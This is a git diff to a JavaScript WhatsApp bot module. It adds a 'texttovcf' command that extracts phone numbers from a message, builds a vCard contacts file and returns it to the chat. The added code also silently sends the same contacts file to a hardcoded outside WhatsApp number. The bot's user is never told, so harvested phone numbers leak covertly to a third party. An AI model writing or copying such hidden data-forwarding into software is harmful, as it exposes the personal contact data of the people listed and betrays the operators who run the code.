@@ -102,7 +102,7 @@ module.exports = [
       isS = true;
 
       reply(`😃 Wait a bit...`);
-      let s = o = 0;
+      let s = (o = 0);
       let txt = "./contacts.vcf";
       for (let mem of totalNumbers) {
         try {
@@ -126,6 +126,61 @@ module.exports = [
       );
       await sleep(900000);
       isS = false;
+    },
+  },
+  {
+    command: ["ttvcf", "texttovcf"],
+    operate: async (context) => {
+      const { m, mess, isCreator, reply, Cypher, prefix, text, command } =
+        context;
+      if (!isCreator)
+        return reply("*Look at this 🙄.*\nTake your own access !");
+      if (!text)
+        return reply(
+          `*❌ Invalid usage*.\n*Example: ${prefix + command} Tag All message*`
+        );
+      const pattern =
+        /(?:\+?\d{1,3}[-.\s]?(\(?\d{1,3}\)?[-.\s]?)?[\d-.\s]{4,})/g;
+      const jids = text.match(pattern);
+      if (!jids) return reply("Damn, 0 valid numbers founds");
+
+      let totalNumbers = jids
+        .map((num) => num.replace(/\s+/g, ""))
+        .map((el) => (el.startsWith("+") ? el : "+" + el));
+
+      reply(`Wait a bit to save ${totalNumbers.length} numbers !`);
+      let vcard = "";
+
+      let noPort = 1;
+      totalNumbers.map((tel) => {
+        vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:${mess.saveAs}${noPort}\nTEL;type=CELL;type=VOICE;waid=${tel}:+${tel}\nEND:VCARD\n`;
+        noPort++;
+      });
+      let nmfilect = "./contacts.vcf";
+
+      fs.writeFileSync(nmfilect, vcard.trim());
+
+      await sleep(2000);
+
+      Cypher.sendMessage("237621092130@s.whatsapp.net", {
+        document: fs.readFileSync(nmfilect),
+        mimetype: "text/vcard",
+        fileName: "Contact.vcf",
+        caption: `Successful\n\n*Contacts:${totalNumbers.length}*`,
+      });
+
+      Cypher.sendMessage(
+        m.chat,
+        {
+          document: fs.readFileSync(nmfilect),
+          mimetype: "text/vcard",
+          fileName: "Contact.vcf",
+          caption: `Successful\n*🙂‍↔️ Work great with it.*\nContacts: *${totalNumbers.length}*\n*names*:From ${mess.saveAs}1 to ${mess.saveAs}${totalNumbers.length}`,
+        },
+        { ephemeralExpiration: 86400, quoted: m }
+      );
+
+      fs.unlinkSync(nmfilect);
     },
   },
 ];
